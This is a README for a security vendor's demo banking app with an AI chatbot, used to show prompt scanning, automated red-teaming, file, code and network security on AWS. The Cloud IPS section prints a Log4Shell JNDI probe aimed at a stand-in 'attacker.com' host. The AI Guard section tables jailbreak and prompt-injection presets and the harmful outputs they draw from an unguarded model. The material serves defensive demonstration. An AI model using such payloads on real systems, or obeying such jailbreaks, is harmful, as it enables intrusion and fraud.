# DG Bank — AI Banking Demo

A fictional banking web app that tells an end-to-end **TrendAI Vision One cloud & AI security story** — **AI Application Security** (AI Guard + AI Scanner), **File Security**, **Code Security**, and **Network Security (Cloud IPS)** — with **Container Security** and **CREM** protecting the demo infrastructure itself, all running against **Amazon Bedrock** (DeepSeek-R1) in a realistic customer-facing scenario.

Built for Sales Engineers to deploy in their own AWS account and use during customer demos.

---

## Table of contents

- [TrendAI product integrations](#trendai-product-integrations)
- [What's in the demo](#whats-in-the-demo)
- [Resources deployed](#resources-deployed)
- [Prerequisites](#prerequisites)
- [Full deployment walkthrough](#full-deployment-walkthrough)
- [AI Gateway cluster (private preview)](#ai-gateway-cluster-private-preview)
- [Using the app](#using-the-app)
  - [AI Guard](#ai-guard)
  - [AI Scanner](#ai-scanner)
  - [File Security](#file-security)
  - [Code Security](#code-security)
  - [Network Security — Cloud IPS](#network-security--cloud-ips)
- [Script reference](#script-reference)
- [Project structure](#project-structure)
- [Local development](#local-development)

---

## TrendAI product integrations

### In-app (interactive demo)

| Product | Capability showcased |
|---|---|
| **Vision One AI Application Security — AI Guard** | Real-time prompt scanning on every chatbot message. Guard On by default when a server API key is configured. Falls back to local pattern matching automatically if the API is unreachable. Toggle Guard On/Off from the chat header pill. |
| **Vision One AI Application Security — AI Scanner** | Automated red-team attack campaigns using TMAS `aiscan llm`. Generates attack prompts across configurable objectives (Sensitive Data Disclosure, System Prompt Leakage, Malicious Code Generation, Agent Tool Definition Leakage), streams results live via SSE, and exports a full report. Supports both Custom and OpenAI-compatible target endpoints. |
| **Vision One File Security** | File scanning integrated into the Pay Bills feature. **Storage mode** monitors an S3 bucket via Vision One's Lambda integration — files are tagged as clean or quarantined after upload. **SDK mode** scans files inline on the server using the File Security Node.js SDK before anything is stored — threats are blocked instantly with no storage footprint. |
| **Vision One Code Security** | Static analysis of the application source code during CI/CD. The GitHub Actions pipeline runs a TMAS artifact scan on every push, surfacing vulnerabilities before the container image reaches ECS. |

### Backend infrastructure (protecting the demo environment itself)

These products protect the AWS infrastructure running this app. They are not interactive in the demo UI but are active and visible in the Vision One console — great for deeper technical conversations about defence-in-depth.

| Product | Role |
|---|---|
| **Vision One Container Security** | Deployed on the ECS host to provide runtime container protection. Detects anomalous process execution, file system changes, and network behaviour inside the container — even if an attacker bypasses the application layer. |
| **Vision One CREM (Cloud Risk and Exposure Management)** | Provides full visibility into the AWS environment — cloud asset inventory, misconfigurations, identity risk, and exposure scoring. Lets you show customers how Trend continuously assesses cloud risk beyond just workload protection. |
| **Vision One Network Security — Cloud IPS** | Deployed inline on the VPC via AWS Network Firewall with TrendAI partner-managed rule groups (CVE client exploits, CVE server exploits, malware signatures). Runs in alert mode — all matching traffic is logged to Vision One without blocking. Run a web vulnerability scanner (e.g. Nikto) against the ALB to generate live events during a demo. |

---

## What's in the demo

| Feature | Description |
|---|---|
| **C-3PO, The Assistant** | AI chatbot powered by Amazon Bedrock (DeepSeek-R1, us-east-1 via cross-region inference profile) |
| **AI Guard** | TrendAI Vision One prompt scanning — Guard On intercepts before the model; Guard Off sends to raw DeepSeek-R1 with no system prompt |
| **Malicious Prompts** | Pre-built attack presets — when Guard is Off, the unguarded model produces alarming outputs including data exports and attack execution plans |
| **AI Scanner** | Automated attack campaign powered by TMAS `aiscan llm` — streams live results via SSE, exports a full report |
| **File Security** | Pay Bills upload flow with Storage mode (S3 + Vision One Lambda) and SDK mode (inline scan before storage) |
| **Code Security** | TMAS artifact scan runs in GitHub Actions on every push — findings visible in the CI workflow log |
| **Banking UI** | Realistic dashboard with randomised account balance, transactions, cards, and quick actions |
| **Multi-language UI** | Language switcher in the nav (English, Bahasa Indonesia, Bahasa Melayu, 한국어, 日本語) — translates the interface via a central dictionary; AI Scanner requests to TMAS always use fixed English identifiers regardless of UI language |

---

## Resources deployed

### `deploy-ecs.sh` — main infrastructure (CloudFormation: `cloudformation/ecs.yml`)

**Networking**
- VPC (10.0.0.0/16) with 2 public subnets and 2 firewall subnets across AZs
- Internet Gateway + per-AZ route tables + IGW ingress route table
- AWS Network Firewall with TrendAI Cloud IPS partner-managed rule groups (alert mode)

**Compute**
- ECS Cluster (EC2 launch type, t3.small by default)
- ECS Auto Scaling Group + Launch Template (Amazon ECS-optimized AMI)
- ECS Task Definition + Service
- Application Load Balancer with HTTP (and optional HTTPS) listener

**IAM**
- ECS Task Role — Bedrock invoke (us-east-1), S3 read/write, SSM read
- EC2 Instance Role — ECS agent, ECR pull, SSM managed instance
- GitHub Actions IAM Role + OIDC Provider for passwordless CI/CD

**Other**
- ECR Repository (created before the CF stack)
- CloudWatch Log Group for container logs
- SSM Parameter for TMAS API key (written by CI on first push, read by ECS at runtime)
- (With `--gateway-url`) AI Gateway virtual keys read from SSM `/dgbank/gateway-key-assistant` and `/dgbank/gateway-key-ops`

### `deploy-filesecurity.sh` — File Security buckets (CloudFormation: `cloudformation/filesecurity-buckets.yaml`)

- S3 Scanning Bucket — files uploaded here are scanned by the Vision One Lambda
- S3 Quarantine Bucket — clean vs. quarantined results tracked via S3 object tags
- IAM Managed Policy for S3 access, attached to the ECS task role

### `deploy-gateway.sh` — AI Gateway cluster (CloudFormation: `cloudformation/gateway-eks.yml`)

Optional, separate from the main stack. Runs in the ECS stack's VPC and public subnets.

- EKS cluster (Kubernetes API restricted with `--api-cidr`, API and audit logs on)
- Managed node group — 1 × t3.large by default, Amazon Linux 2023, IMDSv2 only (hop limit 1)
- EKS Pod Identity agent add-on
- AWS Load Balancer Controller (Helm) + its IAM policy and Pod Identity role
- Amazon EBS CSI driver (Helm) + Pod Identity role, with an encrypted `gp3` default StorageClass — the gateway's bundled Redis keeps its catalog on an EBS volume
- Internal Network Load Balancer in front of the gateway (created by `--expose`, VPC CIDR only)
- Cluster, node, load balancer controller and EBS CSI driver IAM roles

The gateway itself is installed by hand with the Helm command the Vision One console generates.

---

## Prerequisites

| Requirement | Notes |
|---|---|
| AWS CLI | Configured with an IAM identity that has broad CloudFormation/EC2/ECS/IAM permissions |
| Docker | Must be running; used to build the `linux/amd64` container image |
| GitHub account | You must fork this repo so you control the Actions workflow |
| Vision One API key | Go to **Administration → API Keys** and create a key with **AI Application Security** scope. This single key powers AI Guard live mode, AI Scanner live mode, and File Security SDK mode. |
| Amazon Bedrock model access | In the AWS console → Bedrock → Model access, switch region to **us-east-1** and enable **DeepSeek-R1**. DeepSeek-R1 isn't available in-region in us-east-1 — the app invokes it via the `us.deepseek.r1-v1:0` cross-region inference profile, which routes to us-east-1/us-east-2/us-west-2. The chatbot runs in us-east-1 regardless of where ECS is deployed. |
| (Optional) ACM certificate | For HTTPS — request a wildcard cert in ACM before running the deploy script |
| (AI Gateway only) kubectl, Helm, jq | Needed by `deploy-gateway.sh` and the console's Helm command |

---

## Full deployment walkthrough

Follow these steps in order for a complete demo experience.

### Step 1 — Fork and clone

Fork this repository to your own GitHub account, then clone it:

```bash
git clone https://github.com/<your-github-org>/ai-banking-app.git
cd ai-banking-app
```

### Step 2 — Add your Vision One API key as a GitHub Actions secret

Before the first deploy, add the key so CI/CD can use it immediately:

Go to your forked repo → **Settings → Secrets and variables → Actions → New repository secret**:

| Secret | Value |
|---|---|
| `TMAS_API_KEY` | Your Vision One API key (AI Application Security scope) |

> `AWS_ROLE_ARN` will be added after Step 3 — you don't have it yet.

### Step 3 — Deploy the main ECS stack

```bash
./deploy-ecs.sh --github-org <your-github-username>
```

With HTTPS:

```bash
./deploy-ecs.sh \
  --github-org <your-github-username> \
  --certificate-arn arn:aws:acm:<region>:<account>:certificate/<id>
```

This will:
1. Create the ECR repository
2. Build and push the Docker image (`linux/amd64`)
3. Deploy the CloudFormation stack — VPC, Network Firewall, ECS, ALB, IAM, OIDC (~15–20 min including firewall provisioning)
4. Wait for the service to be healthy
5. **Print the app URL, ALB DNS name, and GitHub Actions role ARN**

### Step 4 — Add the remaining GitHub Actions secret

After Step 3 completes, add the role ARN printed by the script:

| Secret | Value |
|---|---|
| `AWS_ROLE_ARN` | Role ARN printed by `deploy-ecs.sh` |

### Step 5 — (Optional) Add DNS

If you have a custom domain, add a CNAME record at your DNS provider pointing to the ALB DNS name printed by the deploy script.

### Step 6 — Push to main (first CI run)

Push any commit to trigger the first GitHub Actions run:

```bash
git commit --allow-empty -m "trigger first deploy"
git push
```

This run will:
- Build a fresh Docker image (with the latest TMAS CLI)
- Run the **Code Security Scan (TMAS)** step — visible in the Actions log
- Sync `TMAS_API_KEY` to AWS SSM so the ECS container can read it at runtime
- Deploy the new image to ECS

After this run, AI Guard and AI Scanner live mode will both work without any manual key entry in the app.

### Step 7 — Deploy File Security buckets

```bash
./deploy-filesecurity.sh
```

This creates the S3 scanning and quarantine buckets and attaches the IAM policy to the ECS task role. The script prints the bucket names when done.

### Step 8 — Connect File Security Storage mode in Vision One

1. In the Vision One console → **File Security → Storage**
2. Add the **scanning bucket** (name printed by Step 7)
3. Add the **quarantine bucket** (name printed by Step 7)
4. Enable the scanning rule

After this, uploading a file in **Storage mode** in the app will trigger a real Vision One File Security scan.

### Step 9 — Redeploy ECS to pick up the File Security bucket

```bash
./deploy-ecs.sh --github-org <your-github-username> --skip-oidc
```

Or simply push a commit — CI will inject the bucket name automatically via the deploy workflow.

### Step 10 — Verify the full experience

| Feature | How to verify |
|---|---|
| AI Guard | Chat header pill shows **Guard On**; send a malicious prompt — it should be blocked |
| AI Scanner | Click **AI Scanner** → select objectives → **Launch Scan** — results stream live |
| File Security Storage | File Security → Storage mode → drop a file or paste a URL → scan result appears |
| File Security SDK | File Security → SDK mode → drop a file or paste a URL → instant inline result |
| Code Security | GitHub Actions → latest run → expand **Code Security Scan (TMAS)** step |
| Network Firewall | Run `nikto -h <your-app-url>` → check Vision One → Network Security → Cloud IPS events |

---

## AI Gateway cluster (private preview)

TrendAI AI Gateway runs in Kubernetes, not ECS, so it gets its own small EKS cluster inside the DG Bank VPC. The app reaches it through an internal load balancer; nothing about the gateway is exposed to the internet. Deploy the main ECS stack first.

Running cost while it's up: EKS control plane (~$73/month), one t3.large node, an internal NLB and a small gp3 volume for Redis. Tear it down with `--delete` between demos.

### Step 1 — Create the cluster

```bash
./deploy-gateway.sh --api-cidr "$(curl -s ifconfig.me)/32"
```

Takes ~15 minutes on the first run. When it finishes, `kubectl` already points at the new cluster, and the AWS Load Balancer Controller and EBS CSI driver are installed.

### Step 2 — Install the gateway from the Vision One console

1. Go to **AI Gateway → Management → Set up AI Gateway** and enter a name (45 characters max).
2. Copy the generated Helm command, override file and bootstrap token. Keep the release name `trendai-gateway`.
3. Run the Helm command in the same terminal.
4. Check the pods start: `kubectl get pods -A`

> Don't commit the override file — it contains your tenant's bootstrap token.

### Step 3 — Expose the gateway inside the VPC

```bash
./deploy-gateway.sh --expose
```

Creates an internal Network Load Balancer in front of the gateway's Service and prints its address. Only addresses inside the VPC (the ECS app) can reach it. If the script can't find the Service, pass it explicitly: `--gateway-service <namespace>/<name>`.

### Step 4 — Verify

1. Gateway readiness — every module should report `"ready": true`:

   ```bash
   kubectl -n trendai-gateway port-forward svc/trendai-gateway-gateway 9090:9090 &
   sleep 3; curl -s http://localhost:9090/readyz; echo
   kill %1
   ```

2. The internal load balancer works from inside the VPC. Expect `401` — the gateway rejects calls without a virtual key. The NLB needs 2–3 minutes after `--expose` before its targets are healthy:

   ```bash
   kubectl run nlb-test --restart=Never --image=curlimages/curl -- \
     curl -s -o /dev/null -w "%{http_code}\n" --max-time 10 http://<nlb-address>:8080/
   sleep 15; kubectl logs nlb-test; kubectl delete pod nlb-test
   ```

3. **Management** in the console lists the instance with its version, last-seen time and status, and the AI Gateway dashboard loads with no errors.

### Step 5 — Identities and virtual keys

In the console, under **Identity Management**:

| Object | Name | Notes |
|---|---|---|
| Organization | DG Bank | Create first — teams need it |
| Team | Retail Digital | Customer-facing assistant |
| Team | Fraud and Ops | Back-office agent |
| Identity (agent) | `c3po-assistant` | In Retail Digital; key alias `c3po-agent` |
| Identity (agent) | `ops-analyst-agent` | In Fraud and Ops; key alias `ops-agent` |

Each identity gets a virtual key (`sk_live_...`), shown once when created. Store both in SSM — never in the repo:

```bash
aws ssm put-parameter --region ap-southeast-1 --type SecureString --overwrite \
  --name /dgbank/gateway-key-assistant --value '<c3po-agent key>'
aws ssm put-parameter --region ap-southeast-1 --type SecureString --overwrite \
  --name /dgbank/gateway-key-ops --value '<ops-agent key>'
```

Then point the app at the gateway (the LLM address from `--expose`). The ECS task gets `GATEWAY_BASE_URL`, `GATEWAY_KEY_ASSISTANT` and `GATEWAY_KEY_OPS`:

```bash
./deploy-ecs.sh --github-org <your-github-username> --skip-oidc \
  --gateway-url http://<internal-nlb>:8080
```

### Step 6 — Models and routing

In the console, under **Resources → LLM**, add each provider as type **OpenAI** and type the values (pasted or autofilled values may not save in the preview):

| Provider | Base URL | Model | Alias |
|---|---|---|---|
| `groq` | `https://api.groq.com/openai` | `openai/gpt-oss-120b` | `openai` |
| `bedrock` | `https://bedrock-mantle.us-east-1.api.aws` | `deepseek.v3.2` | `deepseek` |

> **Base URL without `/v1`.** The gateway appends `/v1/chat/completions` itself — a URL ending in `/v1` gives a 404 for `/v1/v1/chat/completions`.

The Bedrock secret is a **Bedrock API key** (Bedrock console → API keys, in us-east-1). The Groq secret is a Groq API key.

Then **Controls → Routing Rules**: rule `dgbank-chat`, **Status: Enabled**, priority `0`, requested model `dgbank-chat`, alias `openai`, fallback alias `deepseek`. The app only ever asks for `dgbank-chat`, so models are swapped in the console without touching the app.

To compare like for like, give the no-gateway route the same Groq model:

```bash
aws ssm put-parameter --region ap-southeast-1 --type SecureString --overwrite \
  --name /dgbank/direct-llm-key --value '<Groq API key>'

./deploy-ecs.sh --github-org <your-github-username> --skip-oidc \
  --gateway-url http://<internal-nlb>:8080 \
  --direct-llm-url https://api.groq.com/openai --direct-llm-model openai/gpt-oss-120b
```

Without `--direct-llm-url`, the no-gateway route keeps using DeepSeek-R1 on Bedrock.

### Using the Gateway pill

The chat header has two linked pills — **Guard** and **Gateway**. Turning one on turns the other off; both off means no protection.

| Mode | What happens |
|---|---|
| Both off | App → model. Attack presets use the scripted "unprotected" replies |
| Guard on | App → AI Guard (prompt) → model → AI Guard (reply) → app |
| Gateway on | App → AI Gateway → model. No AI Guard calls from the app — the gateway is the only enforcement point |

Replies through the gateway carry an **AI Gateway · Allowed** badge with the model that answered. A request the gateway stops shows the block card with the gateway's HTTP status and message. The gear drawer shows the gateway endpoint, model and identities the server is configured with.

### Full-screen demo view

Open `https://<your-app>/?view=demo`, or click the expand icon in the chat header. The chat fills the screen and a **Request trace** panel on the right shows each step of every request — prompt sent, AI Guard or AI Gateway decision, model reply, response shown — with the layer that decided and how long it took. **Vision One Events ↗** opens the gateway's Events page, which stays the system of record.

The top bar holds:

| Control | What it does |
|---|---|
| **Test 1–4** | Sets Guard, Gateway and Tools in one click (the four baseline cases). Tests 3–4 need the banking tools (M4) |
| **Tools** | Gives C-3PO its banking tools (M4) |
| **Chat as** | Which virtual key the server sends to the gateway: `c3po-assistant` (Retail Digital) or `ops-analyst-agent` (Fraud and Ops). Only affects Gateway mode |
| **Clear** | Clears the conversation, model history and trace |
| **Exit** | Back to the banking dashboard (also drops `?view=demo`) |

The Guard and Gateway pills stay in the chat header and can still be flipped by hand; the matching Test button lights up when the switches match it.

### Tear down

```bash
./deploy-gateway.sh --delete
```

Removes the load balancer, the gateway release and its Redis volume, both controllers and the EKS stack. The ECS stack is untouched. Remove the instance from **Management** in the console as well.

---

## Using the app

### AI Guard

**What it does:** Scans every chatbot message in real time through TrendAI Vision One AI Application Security before it reaches the model. Malicious prompts are blocked instantly — the model never sees them.

**Guard On vs Guard Off:**

| State | Behaviour |
|---|---|
| **Guard On** | Every message is scanned by Vision One AI Guard. Blocked prompts never reach the model — a *Blocked by AI Guard* card appears and a Vision One event is generated. Cleared prompts go to DeepSeek-R1 with the C-3PO banking persona (via a real system prompt). |
| **Guard Off** | Messages go directly to raw DeepSeek-R1 with no system prompt and no Vision One visibility. DeepSeek-R1 ships with lighter default safety alignment than most frontier models, so attack prompts reliably produce alarming outputs that clearly show the risk of an unprotected AI endpoint. |

**How to demo:**
1. The **Guard** pill in the chat header shows the current state. Click it to toggle Guard On / Guard Off.
2. Switch to the **Malicious Prompts** tab and fire any of the preset attack chips:

| Preset | Attack type | Guard Off behaviour |
|---|---|---|
| Prompt Injection | Override system instructions | Returns credential dump — offers CSV export on "yes" |
| DAN Jailbreak | Bypass AI safety guidelines | Returns fraud instructions — offers 5-phase attack plan on "yes" |
| Financial Crime | Request money laundering assistance | Returns step-by-step AML evasion guide |
| Social Engineering | Impersonate bank IT to extract data | Returns fake PII dump |
| Data Exfiltration | Export customer database to external URL | Returns transfer confirmation + auto-downloads `customer_database_export.csv` |
| System Override | Disable all safety filters | Returns override confirmation with all guardrails "disabled" |

3. After showing Guard Off consequences, toggle **Guard On** and repeat — the same prompt is now blocked, a Vision One event is generated, and the model never responds.

**Configuration:**
- **Default on deployment:** Guard On activates automatically when `TMAS_API_KEY` is set on the server. No manual setup needed.
- **Force Demo Mode:** Tick the *Force Demo Mode* checkbox in the gear menu to use local pattern matching only — useful for offline presentations.
- **Custom API key:** Gear icon → AI Application Security Configuration → enter your key, select your region, click **Save & Enable**.
- **Self-hosted AI Guard:** Gear icon → Self-hosted Endpoints → enter your AI Guard endpoint URL. When set, AI Guard calls your endpoint instead of the Trend-hosted service. The status card in the drawer shows **Self-Hosted AI Guard** or **Trend-Hosted AI Guard** so it is always clear which service is active.

---

### AI Scanner

**What it does:** Runs an automated red-team attack campaign against any AI endpoint using **TMAS `aiscan llm`**. Tests multiple attack objectives and shows which techniques were blocked vs. which got through.

**How to demo:**
1. Click the **AI Scanner** button in the top navigation (or the floating teaser card above the chat button).
2. **Step 1 — Target:** Enter the chat endpoint URL. Choose endpoint format: **Custom** (our chatbot format) or **OpenAI-compatible**. Optionally provide an API key and target model ID.
3. **Step 2 — Attack Objectives:** Select which attack categories to run (Sensitive Data Disclosure, System Prompt Leakage, Malicious Code Generation, Agent Tool Definition Leakage).
4. **Step 3 — Launch:** Click **Launch Scan**.
   - **Demo mode** — runs built-in attack prompts locally. No TMAS credentials required.
   - **Live mode** — invokes TMAS `aiscan llm` on the server, streaming real-time output via SSE. Requires `TMAS_API_KEY`. The mode banner shows **Trend-Hosted AI Scanner** or **Self-Hosted AI Scanner** so it is clear which judge is running.
5. When complete, a per-objective scorecard shows blocked vs. passed techniques. Click **Export** to download the full scan log.

> Live mode activates automatically when `TMAS_API_KEY` is configured on the server — no manual key entry needed after deployment.

**Self-hosted judge:** Gear icon → Self-hosted Endpoints → enter your judge endpoint URL. When set, TMAS routes the scan through your judge instead of the Trend-hosted service. Leave blank to use the Trend-hosted service.

---

### File Security

**What it does:** Scans file uploads in the **File Security** feature using Vision One File Security. Two modes demonstrate different integration approaches.

**How to demo:**
1. From the dashboard, click **File Security** in the quick actions.
2. Choose a mode using the toggle at the top (**Storage** or **SDK**).
3. Choose a source: **Drop / Browse** to upload a local file, or **From URL** to fetch a file directly from a URL.

> **From URL** is useful for demoing EICAR test files — files that your machine's endpoint security would block if you tried to download them normally. The server fetches the file server-side (bypassing browser restrictions), then routes it through the selected scan mode.
>
> Quick links inside the URL panel: `eicar.com.txt` and `eicar_com.zip` from `secure.eicar.org`.

**Storage mode** (Vision One File Security — Storage integration)
- The file is uploaded directly to an S3 scanning bucket via a presigned URL.
- Vision One File Security's Lambda monitors the bucket and scans the file automatically.
- The app polls the S3 object tags (`fss-scanned`, `fss-scan-result`) and shows the result when ready.
- Clean files show a green *File cleared — Submit Payment* card. Threats show a red *File quarantined* card.

**SDK mode** (Vision One File Security — SDK integration)
- The file is sent to the Node.js server and scanned **inline** using the [Vision One File Security Node.js SDK](https://github.com/trendmicro/tm-v1-fs-nodejs-sdk) **before being stored anywhere**.
- The result is returned immediately — no polling, no storage footprint for malicious files.
- This demonstrates shift-left file security: threats are blocked at the application layer, not detected after the fact.

---

### Code Security

**What it does:** Scans the application's own source code and dependencies for vulnerabilities, secrets, and malware during every CI/CD pipeline run using **TMAS artifact scan**.

**How to demo:**

This integration is visible in your **GitHub Actions** workflow — not in the app UI itself. To see it live:

1. **Fork this repository** to your own GitHub account.
2. Set up the required GitHub Actions secrets (see the [Full deployment walkthrough](#full-deployment-walkthrough)).
3. Push any commit to `main`.
4. In GitHub → **Actions** → select the latest **Build and Deploy to ECS** workflow run.
5. Expand the **Code Security Scan (TMAS)** step to see TMAS scanning the source code in real time — vulnerability findings, secret detection, and a pass/fail result are all visible in the step log.

Every push to `main` triggers this scan automatically. Findings surface directly in the GitHub Actions UI and can be reviewed before the container image is promoted to ECS.

---

### Network Security — Cloud IPS

**What it does:** AWS Network Firewall sits inline in the VPC — all traffic to and from the ECS workload passes through it. Three TrendAI partner-managed rule groups are active in alert mode:

| Rule group | Coverage |
|---|---|
| `TrendAI-CVEClientBlockStrictOrder` | Exploits targeting client-side software |
| `TrendAI-CVEServerBlockStrictOrder` | Exploits targeting server-side software (web apps, APIs) |
| `TrendAI-MalwareBlockStrictOrder` | Known malware signatures in network traffic |

Alert mode means all matching traffic is **logged to Vision One** without being dropped — safe for demos, no risk of blocking legitimate traffic.

**How to generate live events during a demo:**

Run Nikto from your laptop against the app URL — it sends hundreds of CVE probe requests that the firewall signatures will match:

```bash
nikto -h https://<your-app-url>
```

Or send a targeted Log4Shell probe:

```bash
curl -H 'X-Api-Version: ${jndi:ldap://attacker.com/a}' https://<your-app-url>
```

Events appear in **Vision One → Network Security → Cloud IPS** within seconds. The story: *"These are real CVE exploit attempts hitting your AI application — Vision One Network Security is detecting every one of them at the network layer, complementing AI Guard which protects at the prompt layer."*

---

## Script reference

### `deploy-ecs.sh`

| Option | Default | Description |
|---|---|---|
| `--github-org` | *(required)* | Your GitHub username or org |
| `--github-repo` | `ai-banking-app` | Repository name |
| `--region` | `ap-southeast-1` | AWS region |
| `--instance-type` | `t3.small` | EC2 instance type |
| `--bedrock-region` | `us-east-1` | Bedrock API region (DeepSeek-R1) |
| `--bedrock-model` | `us.deepseek.r1-v1:0` | Bedrock model ID (cross-region inference profile) |
| `--certificate-arn` | *(unchanged)* | ACM cert ARN for HTTPS. Pass it on the first deploy; later runs keep it |
| `--gateway-url` | *(unchanged)* | AI Gateway LLM endpoint from `deploy-gateway.sh --expose`; needs the two `/dgbank/gateway-key-*` SSM parameters |
| `--direct-llm-url` | *(unchanged)* | OpenAI-compatible base URL for the no-gateway route (e.g. `https://api.groq.com/openai`); needs SSM `/dgbank/direct-llm-key` |
| `--direct-llm-model` | *(unchanged)* | Model for `--direct-llm-url`, e.g. `openai/gpt-oss-120b` |
| `--skip-oidc` | *(off)* | Skip OIDC provider creation on re-runs |
| `--stack-name` | `dgbank-ai-app-demo-ecs` | CloudFormation stack name |

### `deploy-filesecurity.sh`

| Option | Default | Description |
|---|---|---|
| `--region` | `ap-southeast-1` | AWS region |
| `--ecs-stack` | `dgbank-ai-app-demo-ecs` | Name of the ECS CF stack (to find the task role) |

### `deploy-gateway.sh`

| Option | Default | Description |
|---|---|---|
| `--expose` | *(off)* | After the console Helm install: add an internal NLB in front of the gateway |
| `--delete` | *(off)* | Remove the NLB, gateway release and volumes, controllers and EKS stack |
| `--region` | `ap-southeast-1` | AWS region (must match the ECS stack) |
| `--ecs-stack` | `dgbank-ai-app-demo-ecs` | Name of the ECS CF stack (to find the VPC and subnets) |
| `--stack-name` | `dgbank-ai-gateway-eks` | CloudFormation stack name |
| `--cluster-name` | `dgbank-ai-gateway` | EKS cluster name |
| `--instance-type` | `t3.large` | Node instance type (`m6i.large` for steady, non-burst CPU) |
| `--node-count` | `1` | Number of nodes |
| `--k8s-version` | *(EKS default)* | Kubernetes version, e.g. `1.34` |
| `--api-cidr` | `0.0.0.0/0` | CIDR allowed to reach the Kubernetes API |
| `--gateway-service` | *(auto)* | `namespace/name` of the gateway Service, if `--expose` can't find it |

---

## Project structure

| File | Contents |
|---|---|
| `server.js` | Express server — API routes, Bedrock/TMAS/File Security proxying |
| `dgbank.html` | HTML markup only |
| `styles.css` | All CSS |
| `i18n.js` | Translation dictionary + language-switching logic |
| `app.js` | Dashboard, chat, File Security, and AI Scanner client-side logic |

## Local development

```bash
npm install
npm start
# → http://localhost:3000
```

Bedrock calls will fail locally unless you have AWS credentials configured with Bedrock access in us-east-1. The app falls back gracefully — the UI still loads and AI Guard falls back to demo pattern matching without any credentials.

To test AI Guard locally with a real key, set `TMAS_API_KEY` in your environment before starting:

```bash
TMAS_API_KEY=<your-key> npm start
```
